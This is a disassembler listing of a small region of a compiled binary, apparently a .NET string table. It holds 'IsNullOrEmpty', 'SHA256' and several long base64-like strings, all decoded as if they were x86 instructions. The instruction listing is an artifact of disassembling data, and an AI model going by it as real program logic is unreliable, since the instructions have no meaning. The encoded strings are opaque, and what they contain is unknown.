  4095ca:	00 49 73             	add    %cl,0x73(%ecx)
  4095cd:	4e                   	dec    %esi
  4095ce:	75 6c                	jne    0x40963c
  4095d0:	6c                   	insb   (%dx),%es:(%edi)
  4095d1:	4f                   	dec    %edi
  4095d2:	72 45                	jb     0x409619
  4095d4:	6d                   	insl   (%dx),%es:(%edi)
  4095d5:	70 74                	jo     0x40964b
  4095d7:	79 00                	jns    0x4095d9
  4095d9:	00 00                	add    %al,(%eax)
  4095db:	00 00                	add    %al,(%eax)
  4095dd:	0d 53 00 48 00       	or     $0x480053,%eax
  4095e2:	41                   	inc    %ecx
  4095e3:	00 32                	add    %dh,(%edx)
  4095e5:	00 35 00 36 00 00    	add    %dh,0x3600
  4095eb:	81 01 4b 00 4b 00    	addl   $0x4b004b,(%ecx)
  4095f1:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  4095f5:	45                   	inc    %ebp
  4095f6:	00 77 00             	add    %dh,0x0(%edi)
  4095f9:	64 00 4b 00          	add    %cl,%fs:0x0(%ebx)
  4095fd:	49                   	dec    %ecx
  4095fe:	00 59 00             	add    %bl,0x0(%ecx)
  409601:	43                   	inc    %ebx
  409602:	00 6a 00             	add    %ch,0x0(%edx)
  409605:	39 00                	cmp    %eax,(%eax)
  409607:	41                   	inc    %ecx
  409608:	00 42 00             	add    %al,0x0(%edx)
  40960b:	75 00                	jne    0x40960d
  40960d:	63 00                	arpl   %eax,(%eax)
  40960f:	66 00 63 00          	data16 add %ah,0x0(%ebx)
  409613:	57                   	push   %edi
  409614:	00 73 00             	add    %dh,0x0(%ebx)
  409617:	72 00                	jb     0x409619
  409619:	44                   	inc    %esp
  40961a:	00 56 00             	add    %dl,0x0(%esi)
  40961d:	51                   	push   %ecx
  40961e:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  409622:	00 6f 00             	add    %ch,0x0(%edi)
  409625:	6e                   	outsb  %ds:(%esi),(%dx)
  409626:	00 36                	add    %dh,(%esi)
  409628:	00 68 00             	add    %ch,0x0(%eax)
  40962b:	6b 00 5a             	imul   $0x5a,(%eax),%eax
  40962e:	00 6f 00             	add    %ch,0x0(%edi)
  409631:	57                   	push   %edi
  409632:	00 4e 00             	add    %cl,0x0(%esi)
  409635:	79 00                	jns    0x409637
  409637:	37                   	aaa
  409638:	00 6d 00             	add    %ch,0x0(%ebp)
  40963b:	59                   	pop    %ecx
  40963c:	00 5a 00             	add    %bl,0x0(%edx)
  40963f:	34 00                	xor    $0x0,%al
  409641:	43                   	inc    %ebx
  409642:	00 54 00 5a          	add    %dl,0x5a(%eax,%eax,1)
  409646:	00 74 00 34          	add    %dh,0x34(%eax,%eax,1)
  40964a:	00 34 00             	add    %dh,(%eax,%eax,1)
  40964d:	6f                   	outsl  %ds:(%esi),(%dx)
  40964e:	00 43 00             	add    %al,0x0(%ebx)
  409651:	61                   	popa
  409652:	00 61 00             	add    %ah,0x0(%ecx)
  409655:	42                   	inc    %edx
  409656:	00 46 00             	add    %al,0x0(%esi)
  409659:	30 00                	xor    %al,(%eax)
  40965b:	35 00 55 00 70       	xor    $0x70005500,%eax
  409660:	00 56 00             	add    %dl,0x0(%esi)
  409663:	46                   	inc    %esi
  409664:	00 71 00             	add    %dh,0x0(%ecx)
  409667:	44                   	inc    %esp
  409668:	00 44 00 38          	add    %al,0x38(%eax,%eax,1)
  40966c:	00 7a 00             	add    %bh,0x0(%edx)
  40966f:	73 00                	jae    0x409671
  409671:	6d                   	insl   (%dx),%es:(%edi)
  409672:	00 73 00             	add    %dh,0x0(%ebx)
  409675:	68 00 31 00 38       	push   $0x38003100
  40967a:	00 43 00             	add    %al,0x0(%ebx)
  40967d:	63 00                	arpl   %eax,(%eax)
  40967f:	63 00                	arpl   %eax,(%eax)
  409681:	57                   	push   %edi
  409682:	00 62 00             	add    %ah,0x0(%edx)
  409685:	55                   	push   %ebp
  409686:	00 52 00             	add    %dl,0x0(%edx)
  409689:	78 00                	js     0x40968b
  40968b:	46                   	inc    %esi
  40968c:	00 42 00             	add    %al,0x0(%edx)
  40968f:	6a 00                	push   $0x0
  409691:	66 00 2b             	data16 add %ch,(%ebx)
  409694:	00 49 00             	add    %cl,0x0(%ecx)
  409697:	76 00                	jbe    0x409699
  409699:	58                   	pop    %eax
  40969a:	00 2b                	add    %ch,(%ebx)
  40969c:	00 67 00             	add    %ah,0x0(%edi)
  40969f:	70 00                	jo     0x4096a1
  4096a1:	74 00                	je     0x4096a3
  4096a3:	37                   	aaa
  4096a4:	00 6d 00             	add    %ch,0x0(%ebp)
  4096a7:	4a                   	dec    %edx
  4096a8:	00 34 00             	add    %dh,(%eax,%eax,1)
  4096ab:	30 00                	xor    %al,(%eax)
  4096ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4096ae:	00 7a 00             	add    %bh,0x0(%edx)
  4096b1:	6c                   	insb   (%dx),%es:(%edi)
  4096b2:	00 54 00 2b          	add    %dl,0x2b(%eax,%eax,1)
  4096b6:	00 32                	add    %dh,(%edx)
  4096b8:	00 66 00             	add    %ah,0x0(%esi)
  4096bb:	47                   	inc    %edi
  4096bc:	00 30                	add    %dh,(%eax)
  4096be:	00 72 00             	add    %dh,0x0(%edx)
  4096c1:	7a 00                	jp     0x4096c3
  4096c3:	72 00                	jb     0x4096c5
  4096c5:	6c                   	insb   (%dx),%es:(%edi)
  4096c6:	00 46 00             	add    %al,0x0(%esi)
  4096c9:	6c                   	insb   (%dx),%es:(%edi)
  4096ca:	00 4a 00             	add    %cl,0x0(%edx)
  4096cd:	6b 00 30             	imul   $0x30,(%eax),%eax
  4096d0:	00 4f 00             	add    %cl,0x0(%edi)
  4096d3:	34 00                	xor    $0x0,%al
  4096d5:	51                   	push   %ecx
  4096d6:	00 61 00             	add    %ah,0x0(%ecx)
  4096d9:	6e                   	outsb  %ds:(%esi),(%dx)
  4096da:	00 48 00             	add    %cl,0x0(%eax)
  4096dd:	74 00                	je     0x4096df
  4096df:	47                   	inc    %edi
  4096e0:	00 52 00             	add    %dl,0x0(%edx)
  4096e3:	76 00                	jbe    0x4096e5
  4096e5:	4b                   	dec    %ebx
  4096e6:	00 52 00             	add    %dl,0x0(%edx)
  4096e9:	71 00                	jno    0x4096eb
  4096eb:	66 00 00             	data16 add %al,(%eax)
  4096ee:	83 59 4f 00          	sbbl   $0x0,0x4f(%ecx)
  4096f2:	68 00 71 00 4f       	push   $0x4f007100
  4096f7:	00 61 00             	add    %ah,0x0(%ecx)
  4096fa:	6f                   	outsl  %ds:(%esi),(%dx)
  4096fb:	00 33                	add    %dh,(%ebx)
  4096fd:	00 4c 00 53          	add    %cl,0x53(%eax,%eax,1)
  409701:	00 65 00             	add    %ah,0x0(%ebp)
  409704:	4e                   	dec    %esi
  409705:	00 72 00             	add    %dh,0x0(%edx)
  409708:	4b                   	dec    %ebx
  409709:	00 53 00             	add    %dl,0x0(%ebx)
  40970c:	30 00                	xor    %al,(%eax)
  40970e:	45                   	inc    %ebp
  40970f:	00 6b 00             	add    %ch,0x0(%ebx)
  409712:	47                   	inc    %edi
  409713:	00 50 00             	add    %dl,0x0(%eax)
  409716:	58                   	pop    %eax
  409717:	00 65 00             	add    %ah,0x0(%ebp)
  40971a:	63 00                	arpl   %eax,(%eax)
  40971c:	76 00                	jbe    0x40971e
  40971e:	58                   	pop    %eax
  40971f:	00 79 00             	add    %bh,0x0(%ecx)
  409722:	59                   	pop    %ecx
  409723:	00 2b                	add    %ch,(%ebx)
  409725:	00 47 00             	add    %al,0x0(%edi)
  409728:	71 00                	jno    0x40972a
  40972a:	53                   	push   %ebx
  40972b:	00 46 00             	add    %al,0x0(%esi)
  40972e:	6b 00 79             	imul   $0x79,(%eax),%eax
  409731:	00 53 00             	add    %dl,0x0(%ebx)
  409734:	51                   	push   %ecx
  409735:	00 45 00             	add    %al,0x0(%ebp)
  409738:	47                   	inc    %edi
  409739:	00 54 00 54          	add    %dl,0x54(%eax,%eax,1)
  40973d:	00 58 00             	add    %bl,0x0(%eax)
  409740:	59                   	pop    %ecx
  409741:	00 57 00             	add    %dl,0x0(%edi)
  409744:	50                   	push   %eax
  409745:	00 30                	add    %dh,(%eax)
  409747:	00 61 00             	add    %ah,0x0(%ecx)
  40974a:	36 00 69 00          	add    %ch,%ss:0x0(%ecx)
  40974e:	7a 00                	jp     0x409750
  409750:	68 00 50 00 36       	push   $0x36005000
  409755:	00 4b 00             	add    %cl,0x0(%ebx)
  409758:	69 00 49 00 69 00    	imul   $0x690049,(%eax),%eax
  40975e:	74 00                	je     0x409760
  409760:	4b                   	dec    %ebx
  409761:	00 7a 00             	add    %bh,0x0(%edx)
  409764:	32 00                	xor    (%eax),%al
  409766:	2f                   	das
  409767:	00 6e 00             	add    %ch,0x0(%esi)
  40976a:	42                   	inc    %edx
  40976b:	00 2f                	add    %ch,(%edi)
  40976d:	00 42 00             	add    %al,0x0(%edx)
  409770:	4b                   	dec    %ebx
  409771:	00 4d 00             	add    %cl,0x0(%ebp)
  409774:	51                   	push   %ecx
  409775:	00 71 00             	add    %dh,0x0(%ecx)
  409778:	75 00                	jne    0x40977a
  40977a:	6d                   	insl   (%dx),%es:(%edi)
  40977b:	00 76 00             	add    %dh,0x0(%esi)
  40977e:	52                   	push   %edx
  40977f:	00 47 00             	add    %al,0x0(%edi)
  409782:	4e                   	dec    %esi
  409783:	00 34 00             	add    %dh,(%eax,%eax,1)
  409786:	68 00 55 00 6a       	push   $0x6a005500
  40978b:	00 62 00             	add    %ah,0x0(%edx)
  40978e:	45                   	inc    %ebp
  40978f:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  409793:	00 79 00             	add    %bh,0x0(%ecx)
  409796:	75 00                	jne    0x409798
  409798:	59                   	pop    %ecx
  409799:	00 45 00             	add    %al,0x0(%ebp)
  40979c:	35 00 74 00 70       	xor    $0x70007400,%eax
  4097a1:	00 30                	add    %dh,(%eax)
  4097a3:	00 64 00 66          	add    %ah,0x66(%eax,%eax,1)
  4097a7:	00 64 00 54          	add    %ah,0x54(%eax,%eax,1)
  4097ab:	00 32                	add    %dh,(%edx)
  4097ad:	00 41 00             	add    %al,0x0(%ecx)
  4097b0:	31 00                	xor    %eax,(%eax)
  4097b2:	49                   	dec    %ecx
  4097b3:	00 36                	add    %dh,(%esi)
  4097b5:	00 79 00             	add    %bh,0x0(%ecx)
  4097b8:	4a                   	dec    %edx
  4097b9:	00 79 00             	add    %bh,0x0(%ecx)
  4097bc:	68 00 73 00 67       	push   $0x67007300
  4097c1:	00 38                	add    %bh,(%eax)
  4097c3:	00 4d 00             	add    %cl,0x0(%ebp)
  4097c6:	35 00 66 00 73       	xor    $0x73006600,%eax
  4097cb:	00 35 00 4e 00 36    	add    %dh,0x36004e00
  4097d1:	00 62 00             	add    %ah,0x0(%edx)
  4097d4:	34 00                	xor    $0x0,%al
  4097d6:	62 00                	bound  %eax,(%eax)
  4097d8:	6e                   	outsb  %ds:(%esi),(%dx)
  4097d9:	00 42 00             	add    %al,0x0(%edx)
  4097dc:	4b                   	dec    %ebx
  4097dd:	00 48 00             	add    %cl,0x0(%eax)
  4097e0:	4b                   	dec    %ebx
  4097e1:	00 6b 00             	add    %ch,0x0(%ebx)
  4097e4:	47                   	inc    %edi
  4097e5:	00 64 00 7a          	add    %ah,0x7a(%eax,%eax,1)
  4097e9:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  4097ed:	00 4c 00 45          	add    %cl,0x45(%eax,%eax,1)
  4097f1:	00 4f 00             	add    %cl,0x0(%edi)
  4097f4:	37                   	aaa
  4097f5:	00 6d 00             	add    %ch,0x0(%ebp)
  4097f8:	64 00 48 00          	add    %cl,%fs:0x0(%eax)
  4097fc:	54                   	push   %esp
  4097fd:	00 74 00 4f          	add    %dh,0x4f(%eax,%eax,1)
  409801:	00 4f 00             	add    %cl,0x0(%edi)
  409804:	5a                   	pop    %edx
  409805:	00 68 00             	add    %ch,0x0(%eax)
  409808:	79 00                	jns    0x40980a
  40980a:	33 00                	xor    (%eax),%eax
  40980c:	4a                   	dec    %edx
  40980d:	00 77 00             	add    %dh,0x0(%edi)
  409810:	2f                   	das
  409811:	00 6a 00             	add    %ch,0x0(%edx)
  409814:	74 00                	je     0x409816
  409816:	6a 00                	push   $0x0
  409818:	63 00                	arpl   %eax,(%eax)
  40981a:	66 00 6d 00          	data16 add %ch,0x0(%ebp)
  40981e:	4a                   	dec    %edx
  40981f:	00 79 00             	add    %bh,0x0(%ecx)
  409822:	6a 00                	push   $0x0
  409824:	4e                   	dec    %esi
  409825:	00 46 00             	add    %al,0x0(%esi)
  409828:	53                   	push   %ebx
  409829:	00 4c 00 71          	add    %cl,0x71(%eax,%eax,1)
  40982d:	00 79 00             	add    %bh,0x0(%ecx)
  409830:	55                   	push   %ebp
  409831:	00 65 00             	add    %ah,0x0(%ebp)
  409834:	4d                   	dec    %ebp
  409835:	00 66 00             	add    %ah,0x0(%esi)
  409838:	33 00                	xor    (%eax),%eax
  40983a:	69 00 6f 00 30 00    	imul   $0x30006f,(%eax),%eax
  409840:	52                   	push   %edx
  409841:	00 53 00             	add    %dl,0x0(%ebx)
  409844:	35 00 49 00 6a       	xor    $0x6a004900,%eax
  409849:	00 48 00             	add    %cl,0x0(%eax)
  40984c:	72 00                	jb     0x40984e
  40984e:	57                   	push   %edi
  40984f:	00 4e 00             	add    %cl,0x0(%esi)
  409852:	49                   	dec    %ecx
  409853:	00 73 00             	add    %dh,0x0(%ebx)
  409856:	2b 00                	sub    (%eax),%eax
  409858:	6d                   	insl   (%dx),%es:(%edi)
  409859:	00 5a 00             	add    %bl,0x0(%edx)
  40985c:	49                   	dec    %ecx
  40985d:	00 78 00             	add    %bh,0x0(%eax)
  409860:	67 00 6f 00          	add    %ch,0x0(%bx)
  409864:	52                   	push   %edx
  409865:	00 67 00             	add    %ah,0x0(%edi)
  409868:	72 00                	jb     0x40986a
  40986a:	72 00                	jb     0x40986c
  40986c:	43                   	inc    %ebx
  40986d:	00 57 00             	add    %dl,0x0(%edi)
  409870:	56                   	push   %esi
  409871:	00 66 00             	add    %ah,0x0(%esi)
  409874:	37                   	aaa
  409875:	00 6f 00             	add    %ch,0x0(%edi)
  409878:	50                   	push   %eax
  409879:	00 70 00             	add    %dh,0x0(%eax)
  40987c:	39 00                	cmp    %eax,(%eax)
  40987e:	4f                   	dec    %edi
  40987f:	00 4c 00 69          	add    %cl,0x69(%eax,%eax,1)
  409883:	00 4e 00             	add    %cl,0x0(%esi)
  409886:	6f                   	outsl  %ds:(%esi),(%dx)
  409887:	00 6a 00             	add    %ch,0x0(%edx)
  40988a:	6d                   	insl   (%dx),%es:(%edi)
  40988b:	00 73 00             	add    %dh,0x0(%ebx)
  40988e:	4b                   	dec    %ebx
  40988f:	00 71 00             	add    %dh,0x0(%ecx)
  409892:	49                   	dec    %ecx
  409893:	00 51 00             	add    %dl,0x0(%ecx)
  409896:	78 00                	js     0x409898
  409898:	59                   	pop    %ecx
  409899:	00 66 00             	add    %ah,0x0(%esi)
  40989c:	34 00                	xor    $0x0,%al
  40989e:	51                   	push   %ecx
  40989f:	00 79 00             	add    %bh,0x0(%ecx)
  4098a2:	49                   	dec    %ecx
  4098a3:	00 30                	add    %dh,(%eax)
  4098a5:	00 2f                	add    %ch,(%edi)
  4098a7:	00 76 00             	add    %dh,0x0(%esi)
  4098aa:	48                   	dec    %eax
  4098ab:	00 35 00 50 00 64    	add    %dh,0x64005000
  4098b1:	00 6c 00 67          	add    %ch,0x67(%eax,%eax,1)
  4098b5:	00 33                	add    %dh,(%ebx)
  4098b7:	00 76 00             	add    %dh,0x0(%esi)
  4098ba:	58                   	pop    %eax
  4098bb:	00 32                	add    %dh,(%edx)
  4098bd:	00 4e 00             	add    %cl,0x0(%esi)
  4098c0:	6b 00 44             	imul   $0x44,(%eax),%eax
  4098c3:	00 52 00             	add    %dl,0x0(%edx)
  4098c6:	34 00                	xor    $0x0,%al
  4098c8:	32 00                	xor    (%eax),%al
  4098ca:	75 00                	jne    0x4098cc
  4098cc:	78 00                	js     0x4098ce
  4098ce:	6e                   	outsb  %ds:(%esi),(%dx)
  4098cf:	00 78 00             	add    %bh,0x0(%eax)
  4098d2:	6e                   	outsb  %ds:(%esi),(%dx)
  4098d3:	00 63 00             	add    %ah,0x0(%ebx)
  4098d6:	41                   	inc    %ecx
  4098d7:	00 49 00             	add    %cl,0x0(%ecx)
  4098da:	75 00                	jne    0x4098dc
  4098dc:	50                   	push   %eax
  4098dd:	00 35 00 38 00 4f    	add    %dh,0x4f003800
  4098e3:	00 6a 00             	add    %ch,0x0(%edx)
  4098e6:	36 00 65 00          	add    %ah,%ss:0x0(%ebp)
  4098ea:	2b 00                	sub    (%eax),%eax
  4098ec:	73 00                	jae    0x4098ee
  4098ee:	65 00 35 00 61 00 35 	add    %dh,%gs:0x35006100
  4098f5:	00 62 00             	add    %ah,0x0(%edx)
  4098f8:	31 00                	xor    %eax,(%eax)
  4098fa:	67 00 7a 00          	add    %bh,0x0(%bp,%si)
  4098fe:	30 00                	xor    %al,(%eax)
  409900:	43                   	inc    %ebx
  409901:	00 58 00             	add    %bl,0x0(%eax)
  409904:	57                   	push   %edi
  409905:	00 4f 00             	add    %cl,0x0(%edi)
  409908:	6d                   	insl   (%dx),%es:(%edi)
  409909:	00 48 00             	add    %cl,0x0(%eax)
  40990c:	62 00                	bound  %eax,(%eax)
  40990e:	6f                   	outsl  %ds:(%esi),(%dx)
  40990f:	00 7a 00             	add    %bh,0x0(%edx)
  409912:	50                   	push   %eax
  409913:	00 63 00             	add    %ah,0x0(%ebx)
  409916:	57                   	push   %edi
  409917:	00 70 00             	add    %dh,0x0(%eax)
  40991a:	42                   	inc    %edx
  40991b:	00 6a 00             	add    %ch,0x0(%edx)
  40991e:	39 00                	cmp    %eax,(%eax)
  409920:	52                   	push   %edx
  409921:	00 6d 00             	add    %ch,0x0(%ebp)
  409924:	33 00                	xor    (%eax),%eax
  409926:	6b 00 64             	imul   $0x64,(%eax),%eax
  409929:	00 35 00 7a 00 34    	add    %dh,0x34007a00
  40992f:	00 34 00             	add    %dh,(%eax,%eax,1)
  409932:	46                   	inc    %esi
  409933:	00 79 00             	add    %bh,0x0(%ecx)
  409936:	44                   	inc    %esp
  409937:	00 65 00             	add    %ah,0x0(%ebp)
  40993a:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40993e:	56                   	push   %esi
  40993f:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  409943:	00 31                	add    %dh,(%ecx)
  409945:	00 52 00             	add    %dl,0x0(%edx)
  409948:	53                   	push   %ebx
  409949:	00 57 00             	add    %dl,0x0(%edi)
  40994c:	64 00 45 00          	add    %al,%fs:0x0(%ebp)
  409950:	53                   	push   %ebx
  409951:	00 42 00             	add    %al,0x0(%edx)
  409954:	41                   	inc    %ecx
  409955:	00 72 00             	add    %dh,0x0(%edx)
  409958:	70 00                	jo     0x40995a
  40995a:	4f                   	dec    %edi
  40995b:	00 63 00             	add    %ah,0x0(%ebx)
  40995e:	54                   	push   %esp
  40995f:	00 65 00             	add    %ah,0x0(%ebp)
  409962:	65 00 30             	add    %dh,%gs:(%eax)
  409965:	00 54 00 47          	add    %dl,0x47(%eax,%eax,1)
  409969:	00 31                	add    %dh,(%ecx)
  40996b:	00 38                	add    %bh,(%eax)
  40996d:	00 55 00             	add    %dl,0x0(%ebp)
  409970:	39 00                	cmp    %eax,(%eax)
  409972:	42                   	inc    %edx
  409973:	00 46 00             	add    %al,0x0(%esi)
  409976:	65 00 6a 00          	add    %ch,%gs:0x0(%edx)
  40997a:	38 00                	cmp    %al,(%eax)
  40997c:	48                   	dec    %eax
  40997d:	00 79 00             	add    %bh,0x0(%ecx)
  409980:	43                   	inc    %ebx
  409981:	00 41 00             	add    %al,0x0(%ecx)
  409984:	6b 00 78             	imul   $0x78,(%eax),%eax
  409987:	00 4e 00             	add    %cl,0x0(%esi)
  40998a:	2f                   	das
  40998b:	00 69 00             	add    %ch,0x0(%ecx)
  40998e:	7a 00                	jp     0x409990
  409990:	58                   	pop    %eax
  409991:	00 48 00             	add    %cl,0x0(%eax)
  409994:	43                   	inc    %ebx
  409995:	00 56 00             	add    %dl,0x0(%esi)
  409998:	31 00                	xor    %eax,(%eax)
  40999a:	30 00                	xor    %al,(%eax)
  40999c:	52                   	push   %edx
  40999d:	00 2f                	add    %ch,(%edi)
  40999f:	00 2b                	add    %ch,(%ebx)
  4099a1:	00 50 00             	add    %dl,0x0(%eax)
  4099a4:	66 00 70 00          	data16 add %dh,0x0(%eax)
  4099a8:	57                   	push   %edi
  4099a9:	00 68 00             	add    %ch,0x0(%eax)
  4099ac:	41                   	inc    %ecx
  4099ad:	00 2f                	add    %ch,(%edi)
  4099af:	00 4c 00 45          	add    %cl,0x45(%eax,%eax,1)
  4099b3:	00 7a 00             	add    %bh,0x0(%edx)
  4099b6:	6c                   	insb   (%dx),%es:(%edi)
  4099b7:	00 4d 00             	add    %cl,0x0(%ebp)
  4099ba:	4e                   	dec    %esi
  4099bb:	00 52 00             	add    %dl,0x0(%edx)
  4099be:	50                   	push   %eax
  4099bf:	00 6a 00             	add    %ch,0x0(%edx)
  4099c2:	44                   	inc    %esp
  4099c3:	00 7a 00             	add    %bh,0x0(%edx)
  4099c6:	34 00                	xor    $0x0,%al
  4099c8:	2b 00                	sub    (%eax),%eax
  4099ca:	70 00                	jo     0x4099cc
  4099cc:	69 00 47 00 59 00    	imul   $0x590047,(%eax),%eax
  4099d2:	4b                   	dec    %ebx
  4099d3:	00 31                	add    %dh,(%ecx)
  4099d5:	00 6c 00 74          	add    %ch,0x74(%eax,%eax,1)
  4099d9:	00 6a 00             	add    %ch,0x0(%edx)
  4099dc:	5a                   	pop    %edx
  4099dd:	00 33                	add    %dh,(%ebx)
  4099df:	00 65 00             	add    %ah,0x0(%ebp)
  4099e2:	36 00 55 00          	add    %dl,%ss:0x0(%ebp)
  4099e6:	4b                   	dec    %ebx
  4099e7:	00 5a 00             	add    %bl,0x0(%edx)
  4099ea:	34 00                	xor    $0x0,%al
  4099ec:	71 00                	jno    0x4099ee
  4099ee:	30 00                	xor    %al,(%eax)
  4099f0:	63 00                	arpl   %eax,(%eax)
  4099f2:	50                   	push   %eax
  4099f3:	00 6d 00             	add    %ch,0x0(%ebp)
  4099f6:	38 00                	cmp    %al,(%eax)
  4099f8:	72 00                	jb     0x4099fa
  4099fa:	74 00                	je     0x4099fc
  4099fc:	4c                   	dec    %esp
  4099fd:	00 41 00             	add    %al,0x0(%ecx)
  409a00:	33 00                	xor    (%eax),%eax
  409a02:	6c                   	insb   (%dx),%es:(%edi)
  409a03:	00 37                	add    %dh,(%edi)
  409a05:	00 6b 00             	add    %ch,0x0(%ebx)
  409a08:	34 00                	xor    $0x0,%al
  409a0a:	59                   	pop    %ecx
  409a0b:	00 48 00             	add    %cl,0x0(%eax)
  409a0e:	58                   	pop    %eax
  409a0f:	00 74 00 46          	add    %dh,0x46(%eax,%eax,1)
  409a13:	00 33                	add    %dh,(%ebx)
  409a15:	00 58 00             	add    %bl,0x0(%eax)
  409a18:	61                   	popa
  409a19:	00 4a 00             	add    %cl,0x0(%edx)
  409a1c:	4e                   	dec    %esi
  409a1d:	00 50 00             	add    %dl,0x0(%eax)
  409a20:	4b                   	dec    %ebx
  409a21:	00 68 00             	add    %ch,0x0(%eax)
  409a24:	4e                   	dec    %esi
  409a25:	00 61 00             	add    %ah,0x0(%ecx)
  409a28:	33 00                	xor    (%eax),%eax
  409a2a:	62 00                	bound  %eax,(%eax)
  409a2c:	31 00                	xor    %eax,(%eax)
  409a2e:	77 00                	ja     0x409a30
  409a30:	39 00                	cmp    %eax,(%eax)
  409a32:	71 00                	jno    0x409a34
  409a34:	74 00                	je     0x409a36
  409a36:	54                   	push   %esp
  409a37:	00 77 00             	add    %dh,0x0(%edi)
  409a3a:	4f                   	dec    %edi
  409a3b:	00 47 00             	add    %al,0x0(%edi)
  409a3e:	68 00 5a 00 31       	push   $0x31005a00
  409a43:	00 77 00             	add    %dh,0x0(%edi)
  409a46:	3d 00 00 80 b1       	cmp    $0xb1800000,%eax
  409a4b:	41                   	inc    %ecx
  409a4c:	00 4c 00 44          	add    %cl,0x44(%eax,%eax,1)
  409a50:	00 74 00 4b          	add    %dh,0x4b(%eax,%eax,1)
  409a54:	00 4e 00             	add    %cl,0x0(%esi)
  409a57:	6c                   	insb   (%dx),%es:(%edi)
  409a58:	00 6d 00             	add    %ch,0x0(%ebp)
  409a5b:	35 00 51 00 5a       	xor    $0x5a005100,%eax
  409a60:	00 62 00             	add    %ah,0x0(%edx)
  409a63:	39 00                	cmp    %eax,(%eax)
  409a65:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  409a69:	76 00                	jbe    0x409a6b
  409a6b:	52                   	push   %edx
  409a6c:	00 35 00 48 00 43    	add    %dh,0x43004800
  409a72:	00 4f 00             	add    %cl,0x0(%edi)
  409a75:	64 00 58 00          	add    %bl,%fs:0x0(%eax)
  409a79:	50                   	push   %eax
  409a7a:	00 36                	add    %dh,(%esi)
  409a7c:	00 63 00             	add    %ah,0x0(%ebx)
  409a7f:	4c                   	dec    %esp
  409a80:	00 49 00             	add    %cl,0x0(%ecx)
  409a83:	4c                   	dec    %esp
  409a84:	00 4a 00             	add    %cl,0x0(%edx)
  409a87:	63 00                	arpl   %eax,(%eax)
  409a89:	4d                   	dec    %ebp
  409a8a:	00 34 00             	add    %dh,(%eax,%eax,1)
  409a8d:	45                   	inc    %ebp
  409a8e:	00 57 00             	add    %dl,0x0(%edi)
  409a91:	50                   	push   %eax
  409a92:	00 32                	add    %dh,(%edx)
  409a94:	00 78 00             	add    %bh,0x0(%eax)
  409a97:	57                   	push   %edi
  409a98:	00 47 00             	add    %al,0x0(%edi)
  409a9b:	69 00 50 00 5a 00    	imul   $0x5a0050,(%eax),%eax
  409aa1:	67 00 6e 00          	add    %ch,0x0(%bp)
  409aa5:	44                   	inc    %esp
  409aa6:	00 30                	add    %dh,(%eax)
  409aa8:	00 37                	add    %dh,(%edi)
  409aaa:	00 34 00             	add    %dh,(%eax,%eax,1)
  409aad:	30 00                	xor    %al,(%eax)
  409aaf:	32 00                	xor    (%eax),%al
  409ab1:	63 00                	arpl   %eax,(%eax)
  409ab3:	77 00                	ja     0x409ab5
  409ab5:	38 00                	cmp    %al,(%eax)
  409ab7:	6d                   	insl   (%dx),%es:(%edi)
  409ab8:	00 75 00             	add    %dh,0x0(%ebp)
  409abb:	55                   	push   %ebp
  409abc:	00 4f 00             	add    %cl,0x0(%edi)
  409abf:	59                   	pop    %ecx
  409ac0:	00 57 00             	add    %dl,0x0(%edi)
  409ac3:	59                   	pop    %ecx
  409ac4:	00 4c 00 4e          	add    %cl,0x4e(%eax,%eax,1)
  409ac8:	00 6c 00 47          	add    %ch,0x47(%eax,%eax,1)
  409acc:	00 77 00             	add    %dh,0x0(%edi)
  409acf:	69 00 72 00 4a 00    	imul   $0x4a0072,(%eax),%eax
  409ad5:	71 00                	jno    0x409ad7
  409ad7:	49                   	dec    %ecx
  409ad8:	00 66 00             	add    %ah,0x0(%esi)
  409adb:	2b 00                	sub    (%eax),%eax
  409add:	4a                   	dec    %edx
  409ade:	00 31                	add    %dh,(%ecx)
  409ae0:	00 68 00             	add    %ch,0x0(%eax)
  409ae3:	30 00                	xor    %al,(%eax)
  409ae5:	4e                   	dec    %esi
  409ae6:	00 6a 00             	add    %ch,0x0(%edx)
  409ae9:	4f                   	dec    %edi
  409aea:	00 52 00             	add    %dl,0x0(%edx)
  409aed:	54                   	push   %esp
  409aee:	00 65 00             	add    %ah,0x0(%ebp)
  409af1:	39 00                	cmp    %eax,(%eax)
  409af3:	47                   	inc    %edi
  409af4:	00 77 00             	add    %dh,0x0(%edi)
  409af7:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  409afc:	80 b1 64 00 56 00 4d 	xorb   $0x4d,0x560064(%ecx)
  409b03:	00 45 00             	add    %al,0x0(%ebp)
  409b06:	65 00 77 00          	add    %dh,%gs:0x0(%edi)
  409b0a:	4f                   	dec    %edi
  409b0b:	00 58 00             	add    %bl,0x0(%eax)
  409b0e:	47                   	inc    %edi
  409b0f:	00 6a 00             	add    %ch,0x0(%edx)
  409b12:	39 00                	cmp    %eax,(%eax)
  409b14:	4a                   	dec    %edx
  409b15:	00 59 00             	add    %bl,0x0(%ecx)
  409b18:	65 00 31             	add    %dh,%gs:(%ecx)
  409b1b:	00 2f                	add    %ch,(%edi)
  409b1d:	00 47 00             	add    %al,0x0(%edi)
  409b20:	76 00                	jbe    0x409b22
  409b22:	6c                   	insb   (%dx),%es:(%edi)
  409b23:	00 35 00 69 00 56    	add    %dh,0x56006900
  409b29:	00 54 00 74          	add    %dl,0x74(%eax,%eax,1)
  409b2d:	00 30                	add    %dh,(%eax)
  409b2f:	00 36                	add    %dh,(%esi)
  409b31:	00 67 00             	add    %ah,0x0(%edi)
  409b34:	37                   	aaa
  409b35:	00 68 00             	add    %ch,0x0(%eax)
  409b38:	56                   	push   %esi
  409b39:	00 6d 00             	add    %ch,0x0(%ebp)
  409b3c:	46                   	inc    %esi
  409b3d:	00 75 00             	add    %dh,0x0(%ebp)
  409b40:	53                   	push   %ebx
  409b41:	00 4a 00             	add    %cl,0x0(%edx)
  409b44:	38 00                	cmp    %al,(%eax)
  409b46:	53                   	push   %ebx
  409b47:	00 56 00             	add    %dl,0x0(%esi)
  409b4a:	4c                   	dec    %esp
  409b4b:	00 30                	add    %dh,(%eax)
  409b4d:	00 44 00 50          	add    %al,0x50(%eax,%eax,1)
  409b51:	00 34 00             	add    %dh,(%eax,%eax,1)
  409b54:	78 00                	js     0x409b56
